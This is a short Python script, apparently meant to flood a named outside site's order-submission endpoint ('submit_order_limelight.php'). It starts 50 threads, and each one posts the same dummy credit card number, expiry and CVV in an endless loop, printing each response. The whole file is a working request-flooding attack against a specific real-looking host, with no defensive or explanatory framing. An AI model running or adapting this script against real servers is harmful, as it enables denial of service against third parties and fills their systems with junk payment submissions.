import requests
import threading


url = 'http://luckypro12.com/PS5/includes/submit_order_limelight.php'

data = {
'cc_number' : '4007000000027',
'cc_expmonth' : '8',
'cc_expyear' : '21',
'cc_cvv' : '432'
}

def send_request():
    while True:
        response = requests.post(url, data = data)
        print(response)


threads = []

#we want to send many requests at the same time using threads. We are creating 50 threads
for i in range(50):
    t = threading.Thread(target = send_request)
    t.daemon = True
    threads.append(t)

for i in range(50):
    threads[i].start()

for i in range(50):
    threads[i].join()
